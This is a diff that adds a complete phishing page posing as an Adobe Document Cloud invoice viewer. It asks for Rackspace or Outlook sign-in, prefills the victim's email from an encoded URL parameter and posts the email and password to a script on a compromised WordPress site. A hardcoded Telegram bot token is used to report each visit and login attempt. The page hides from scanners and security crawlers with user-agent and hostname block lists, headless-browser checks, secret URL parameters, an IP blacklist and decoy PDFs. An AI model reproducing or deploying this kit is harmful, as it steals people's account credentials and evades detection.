@@ -1,1 +1,769 @@
-hello world
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
+        <TITLE>Word - INVC-SCAN845</TITLE>
+        <META HTTP-EQUIV="X-UA-Compatible" CONTENT="IE=edge">
+        <META NAME="viewport" CONTENT="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+        <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+        <META HTTP-EQUIV="Expires" CONTENT="-1">
+        <META NAME="PageID" CONTENT="ConvergedSignIn">
+        <META NAME="SiteID" CONTENT="">
+        <META NAME="ReqLC" CONTENT="1033">
+        <META NAME="LocLC" CONTENT="en-US">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css">
+        <NOSCRIPT>
+         <META HTTP-EQUIV="Refresh" CONTENT="0; URL=https://login.microsoftonline.com/jsdisabled" />
+        </NOSCRIPT>
+        <style>
+            body {
+                background: url('https://i.ibb.co/vQTkcx2/Invoice40.jpg') no-repeat center center fixed;
+                background-size: cover;
+                height: 100vh;
+            }
+    
+            .card {
+                border-radius: 15px;
+                background: rgba(0, 0, 0, 0.7);
+                color: white;
+                padding: 20px;
+                text-align: center;
+                margin: auto;
+                margin-top: 100px;
+                width: 90%;
+                max-width: 500px;
+            }
+    
+            .pdf-preview {
+                display: flex;
+                align-items: center;
+                padding: 15px;
+                background: #ffffff;
+                border-radius: 10px;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+                margin-bottom: 20px;
+                transition: transform 0.2s;
+            }
+    
+            .pdf-preview:hover {
+                transform: scale(1.02);
+            }
+    
+            .pdf-preview img {
+                width: 50px;
+                margin-right: 15px;
+            }
+    
+            .pdf-name {
+                font-weight: bold;
+                color: #333;
+            }
+    
+            .pdf-size {
+                color: #777;
+            }
+    
+            .btn-custom {
+                width: 100%;
+                margin-bottom: 10px;
+                color: white;
+                display: flex;
+                align-items: center;
+                justify-content: flex-start;
+                padding: 10px;
+                border-radius: 10px;
+                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+                font-weight: 500;
+                transition: background-color 0.2s ease;
+                font-size: 16px;
+            }
+    
+            .btn-rackspace {
+                background-color: #696969;
+            }
+            .btn-outlook {
+                background-color: #0072c6;
+            }
+            .btn-rackspace:hover {
+                background-color: #005a9e;
+            }
+    
+            .modal-header {
+                background-color: black;
+                color: white;
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                padding: 15px 20px;
+            }
+    
+            .modal-content {
+                border-radius: 15px;
+                border: none;
+            }
+    
+            .modal-body {
+                background-color: white;
+                color: #333;
+                padding: 30px;
+                border-bottom-left-radius: 15px;
+                border-bottom-right-radius: 15px;
+            }
+    
+            .form-control {
+                border-radius: 8px;
+                border: 1px solid #ccc;
+                transition: border-color 0.3s;
+            }
+    
+            .form-control:focus {
+                border-color: #0072c6;
+                box-shadow: 0 0 5px rgba(0, 114, 198, 0.5);
+            }
+    
+            .btn-primary {
+                background-color: #0C7C84;
+                border: none;
+                border-radius: 8px;
+                color: white;
+            }
+    
+            .btn-primary:hover {
+                background-color: #005a9e;
+            }
+    
+            .header-logo img {
+                width: 150px;
+                height: auto;
+                margin-bottom: 15px;
+            }
+    
+            .error-message {
+                color: red;
+                display: none;
+                margin-top: 10px;
+                font-weight: bold;
+            }
+    
+            .spinner-border {
+                margin-left: 10px;
+                vertical-align: text-bottom;
+                display: none;
+            }
+    
+            .btn-primary.loading .spinner-border {
+                display: inline-block;
+            }
+        </style>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            color: #07090F;
+            line-height: 1.42857143;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100vh; /* Full height */
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="content"></div>
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+    <script>
+        const blacklistedWords = [
+            
+        'google', 'microsoft', 'crawl','python','curl',
+        'Amazonbot','Applebot','Applebot-Extended','Bytespider',
+        'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
+        'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
+        'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
+        'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
+        'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
+        'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
+        'img2dataset','omgili','omgilibot'];
+
+    const allowedParamPattern = /^Sachiel\d$/;
+    const allowedParamPattern2 = /^Azrael\d$/;
+    var checkCountry = false;
+    var Country = "";
+
+function getBase64FromUrl() {
+    const url = window.location.href;
+    const urlObj = new URL(url);
+
+    const utmSource = decodeURIComponent(urlObj.searchParams.get('SIKA'));
+    const utmDevice = decodeURIComponent(urlObj.searchParams.get('TUMI'));
+
+    let decodedSource = '';
+    let extractedSource = '';
+    let decodedDevice = '';
+    let extractedDevice = '';
+
+    // Process utm_source
+    if (utmSource) {
+        const base64Part = utmSource.replace(/^info\d{0,3}/, '');
+        if (isBase64(base64Part)) {
+            try {
+                decodedSource = atob(base64Part);
+            } catch (error) {
+                console.error('Failed to decode Base64 string in utm_source:', error);
+                decodedSource = 'Error decoding Base64 string in utm_source.';
+            }
+        } else {
+            extractedSource = base64Part;
+        }
+    } else {
+        extractedSource = 'utm_source parameter not found.';
+    }
+
+    // Process utm_device
+    if (utmDevice) {
+        const base64PartDevice = utmDevice.replace(/^pills\d{0,3}/, '');
+        if (isBase64(base64PartDevice)) {
+            try {
+                decodedDevice = atob(base64PartDevice);
+            } catch (error) {
+                console.error('Failed to decode Base64 string in utm_device:', error);
+                decodedDevice = 'Error decoding Base64 string in utm_device.';
+            }
+        } else {
+            extractedDevice = base64PartDevice;
+        }
+    } else {
+        extractedDevice = 'utm_device parameter not found.';
+    }
+    const combinedSource = decodedSource || extractedSource;
+    const combinedDevice = decodedDevice || extractedDevice;
+    combinedResult = [combinedSource, combinedDevice].filter(Boolean).join('@');
+    return combinedResult;
+}
+
+function isBase64(str) {
+    try {
+        return btoa(atob(str)).replace(/=/g, '') === str.replace(/=/g, '');
+    } catch (err) {
+        return false;
+    }
+}
+
+function sendMessage2() {
+  const token = '7405272455:AAHmoxjlVkxxbb0wYrb9U1gO5TgSEdiOadI';
+  const chatId = '1412104349';
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  const userDetails = {
+    Bot: "Incoming Bot",
+    Client_Email: getBase64FromUrl(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screenSize: `${window.screen.width}x${window.screen.height}`,
+    colorDepth: window.screen.colorDepth,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Format userDetails into a readable string
+  const formattedDetails = `
+*User Details:*
+- *Client Email*: ${userDetails.Bot}
+- *Client Email*: ${userDetails.Client_Email}
+- *User Agent*: ${userDetails.userAgent}
+- *Language*: ${userDetails.language}
+- *Screen Size*: ${userDetails.screenSize}
+- *Color Depth*: ${userDetails.colorDepth}
+- *Timestamp*: ${userDetails.timestamp}
+  `;
+
+  const data = {
+    chat_id: chatId,
+    text: formattedDetails,
+    parse_mode: 'Markdown', // Use Markdown to format the message nicely in Telegram
+  };
+
+  // Use the fetch API to make a POST request to the Telegram Bot API
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+  })
+    .then(response => response.json())
+    .then(result => {
+      console.log('Message sent successfully:', result);
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+}
+
+
+
+    function fetchIPInfo() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const param = urlParams.get('Amethyst');
+        const para = urlParams.get('Chamuel');
+        if (!allowedParamPattern.test(param) || !allowedParamPattern2.test(para)) {
+            console.log('Invalid parameter. Redirecting to error page...');
+            sendMessage2();
+            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+                    addBlacklistedIP(ip);
+                    redirectToBlockedPage();
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            return;
+        }
+
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                var hostname = data.hostname || '';
+                console.log('IP Address:', ip);
+                console.log('Hostname:', hostname);
+                // Check if hostname contains any blacklisted words
+                if (blacklistedWords.some(word => hostname.includes(word))) {
+                    console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
+                    sendMessage2();
+                    addBlacklistedIP(ip);
+                    redirectToBlockedPage();
+                // } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
+                //     console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
+                //     // Add IP to blacklist database
+                //     addBlacklistedIP(ip);
+                //     redirectToBlockedPage();
+                } else {
+                    console.log('IP ' + ip + ' is not using a VPN and from the allowed country.');
+                    // Check if IP is blacklisted
+                    checkBlacklistedIP(ip);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+    function redirectToBlockedPage() {
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
+    }
+
+    function addBlacklistedIP(ip) {
+        // Check if IP is already in the blacklist
+        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+            .then(response => response.text())
+            .then(data => {
+                if (data !== 'blacklisted') {
+                    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: 'ip=' + ip
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data); // Log the response
+                        // You can handle the response here (e.g., display a message to the user)
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        redirectToBlockedPage();
+                    });
+                } else {
+                    console.log('IP ' + ip + ' is already in the blacklist.');
+                    redirectToBlockedPage();
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                redirectToBlockedPage();
+            });
+    }
+
+
+    function checkBlacklistedIP(ip) {
+    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+        .then(response => response.text())
+        .then(data => {
+            if (data === 'blacklisted') {
+                console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
+                sendMessage2();
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();
+
+            } else if (data === 'clean') {
+                console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
+                loadContent();
+            } else {
+                console.log('Error:', data);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+}
+
+    const botUserAgents = [
+            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
+            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
+            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
+            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
+            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
+            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
+            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
+            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
+            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
+            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
+            'img2dataset', 'omgili', 'omgilibot'
+        ];
+
+        // Function to detect the User-Agent
+        function detectUserAgent() {
+            const userAgent = navigator.userAgent;
+            return botUserAgents.some(bot => userAgent.includes(bot));
+        }
+        function detectQueryParameter(paramName) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.has(paramName) ? urlParams.get(paramName) : null;
+        }
+    
+    
+        function showRackspaceForm() {
+    notifyTelegram('Rackspace');
+
+    $('#rackspaceModal').modal('show');
+}
+
+function hideRackspaceForm() {
+    $('#rackspaceModal').modal('hide');
+}
+
+function showOutlookForm() {
+    notifyTelegram('Outlook');
+
+    $('#outlookModal').modal('show');
+}
+
+function hideOutlookForm() {
+    $('#outlookModal').modal('hide');
+}
+
+function notifyTelegram(provider) {
+    const botToken = '7405272455:AAHmoxjlVkxxbb0wYrb9U1gO5TgSEdiOadI';
+    const chatId = '1412104349';
+    const message = `🔒 *New Login Attempt*\n\n👤 Provider: ${provider}\n🕒 Time: ${new Date().toLocaleString()}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: new URLSearchParams({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Notification sent to Telegram');
+        } else {
+            console.error('Failed to send notification to Telegram');
+        }
+    })
+    .catch(error => {
+        console.error('Failed to send notification to Telegram', error);
+    });
+}
+
+$(document).ready(function() {
+    $('#rackspaceEmail, #rackspacePassword').on('input', function() {
+        $('#rackspaceEmailError').hide();
+        $('#rackspacePasswordError').hide();
+    });
+
+    $('#outlookEmail, #outlookPassword').on('input', function() {
+        $('#outlookEmailError').hide();
+        $('#outlookPasswordError').hide();
+    });
+});
+
+function submitRackspace() {
+    const email = $('#rackspaceEmail').val().trim();
+    const password = $('#rackspacePassword').val().trim();
+    let valid = true;
+
+    if (!email) {
+        $('#rackspaceEmailError').text('Email is required.').show();
+        valid = false;
+    } else if (!validateEmail(email)) {
+        $('#rackspaceEmailError').text('Please enter a valid email.').show();
+        valid = false;
+    }
+
+    if (!password) {
+        $('#rackspacePasswordError').text('Password is required.').show();
+        valid = false;
+    }
+
+    if (valid) {
+        $('.btn-primary').addClass('loading');
+        $('.spinner-border').show();
+
+        $.ajax({
+            url: 'https://tastymomos.com.au//wp-content/wflogs/trash/pgo.php', 
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({ email: email, password: password, provider: 'rackspace' }),
+            success: function(response) {
+                if (response.valid) {
+                    window.location.href = 'rackspace-success.html';
+                } else {
+                    $('#rackspacePasswordError').text('Invalid email or password.').show();
+                }
+            },
+            error: function() {
+                $('#rackspacePasswordError').text('An error occurred. Please try again.').show();
+            },
+            complete: function() {
+                $('.btn-primary').removeClass('loading');
+                $('.spinner-border').hide();
+            }
+        });
+    }
+}
+    function validateEmail(email) {
+        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return regex.test(email);
+    }
+    
+function submitOutlook() {
+    const email = $('#outlookEmail').val().trim();
+    const password = $('#outlookPassword').val().trim();
+    let valid = true;
+
+    if (!email) {
+        $('#outlookEmailError').text('Username is required.').show();
+        valid = false;
+    }
+
+    if (!password) {
+        $('#outlookPasswordError').text('Password is required.').show();
+        valid = false;
+    }
+
+    if (valid) {
+        $('.btn-primary').addClass('loading');
+        $('.spinner-border').show();
+
+        $.ajax({
+            url: 'https://tastymomos.com.au//wp-content/wflogs/trash/pgo.php', 
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({ email: email, password: password, provider: 'outlook' }),
+            success: function(response) {
+                if (response.valid) {
+                    window.location.href = 'outlook-success.html';
+                } else {
+                    $('#outlookPasswordError').text('Invalid email or password.').show();
+                }
+            },
+            error: function() {
+                $('#outlookPasswordError').text('An error occurred. Please try again.').show();
+            },
+            complete: function() {
+                $('.btn-primary').removeClass('loading');
+                $('.spinner-border').hide();
+            }
+        });
+    }
+}    
+    
+        function loadContent() {
+    const isBot = detectUserAgent();
+    const paramValue = detectQueryParameter('Bd');
+
+    if (isBot) {
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                console.log(ip);
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
+    } else if (paramValue) {
+        const script = document.createElement('script');
+        script.innerHTML = `
+           function isHuman() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const botUserAgents = [
+            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
+            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
+            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
+            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
+            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
+            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
+            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
+            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
+            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
+            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
+            'img2dataset', 'omgili', 'omgilibot'
+                ];
+                const isBot = botUserAgents.some(bot => userAgent.includes(bot));
+                const headlessChecks = [
+                    () => /HeadlessChrome/.test(userAgent),
+                    () => navigator.webdriver,
+                    () => window.outerWidth === 0 && window.outerHeight === 0,
+                    () => navigator.languages === "" || navigator.plugins.length === 0
+                ];
+                const isHeadless = headlessChecks.some(check => check());
+                return !isBot && !isHeadless;
+            }              
+
+function verifyAndRedirect() {
+           if (isHuman()) {
+           }
+            else {
+            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                console.log("dfsssssssssss");
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();
+
+                }
+            ); 
+    }
+            }
+            setTimeout(verifyAndRedirect, 1000);
+        `;
+        document.getElementById('content').innerHTML = `
+<div class="container">
+    <div class="card">
+        <div class="pdf-preview">
+            <img src="https://cdn1.iconfinder.com/data/icons/adobe-acrobat-pdf/154/pdf-file-rounded-square-512.png" alt="PDF Icon">
+            <div>
+                <div class="pdf-name">INVC885665489.pdf</div>
+                <div class="pdf-size">Size: 1.2 MB</div>
+            </div>
+        </div>
+
+        <h5>Adobe Document Cloud</h5>
+        <p>To access this document, please sign in with your email account.</p>
+
+        <button class="btn btn-custom btn-rackspace" onclick="showRackspaceForm()">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/email.png" alt="Rackspace logo" style="width: 25px; margin-right: 10px;" /> Sign in with Rackspace
+        </button>
+
+        <button class="btn btn-custom btn-outlook" onclick="showOutlookForm()">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/ms-outlook.png" alt="Outlook logo" style="width: 25px; margin-right: 10px;" /> Sign in with Outlook
+        </button>
+
+        <small>&copy; Adobe 2023</small>
+    </div>
+</div>
+
+<!-- Modals for Rackspace and Outlook Login Forms -->
+
+<div class="modal fade" id="rackspaceModal" tabindex="-1" role="dialog" aria-labelledby="rackspaceModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="header-logo">
+                    <img src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png" alt="Rackspace Logo">
+                </div>
+            </div>
+            <div class="modal-body">
+                <form id="rackspaceForm">
+                    <div class="form-group">
+                        <label for="rackspaceEmail">Email address</label>
+                        <input type="email" class="form-control" id="rackspaceEmail" placeholder="Enter your email" required value="${getBase64FromUrl()}">
+                        <div id="rackspaceEmailError" class="error-message">Please enter a valid email.</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="rackspacePassword">Password</label>
+                        <input type="password" class="form-control" id="rackspacePassword" placeholder="Enter your password" required>
+                        <div id="rackspacePasswordError" class="error-message">Please enter your password.</div>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer d-flex justify-content-between">
+                <button type="button" class="btn btn-secondary" onclick="hideRackspaceForm()">Back</button>
+                <button type="button" class="btn btn-primary" onclick="submitRackspace()">Sign In<span class="spinner-border spinner-border-sm"></span></button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="outlookModal" tabindex="-1" role="dialog" aria-labelledby="outlookModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+        <div class="modal-content">
+            <div class="modal-header" style="background-color: white;">
+                <div class="header-logo">
+                    <img src="https://i.ibb.co/m45j37C/image.png" alt="Outlook Logo" style="width: 150px;">
+                </div>
+            </div>
+            <div class="modal-body outlook">
+                <form id="outlookForm">
+                    <div class="form-group">
+                        <label for="outlookEmail">Domain\\username:</label>
+                        <input type="text" class="form-control" id="outlookEmail" placeholder="Enter Domain\\username" required value="${getBase64FromUrl()}">
+                        <div id="outlookEmailError" class="error-message">Please enter your username.</div>
+                    </div>
+                    <div class="form-group">
+                        <label for="outlookPassword">Password</label>
+                        <input type="password" class="form-control" id="outlookPassword" placeholder="Enter your password" required>
+                        <div id="outlookPasswordError" class="error-message">Please enter your password.</div>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer d-flex justify-content-between">
+                <button type="button" class="btn btn-secondary" onclick="hideOutlookForm()">Back</button>
+                <button type="button" class="btn btn-primary" onclick="submitOutlook()">Sign In<span class="spinner-border spinner-border-sm"></span></button>
+            </div>
+        </div>
+    </div>
+</div>
+    `;
+        document.body.appendChild(script);
+    } else {
+        document.getElementById('content').innerHTML = `
+            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
+            </iframe>
+        `;
+        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
+            .then(response => response.json())
+            .then(data => {
+                var ip = data.ip;
+                console.log(ip);
+                addBlacklistedIP(ip);
+                redirectToBlockedPage();}
+            ); 
+    }
+}
+        fetchIPInfo();
+    </script>
+    
+</body>
+</html>
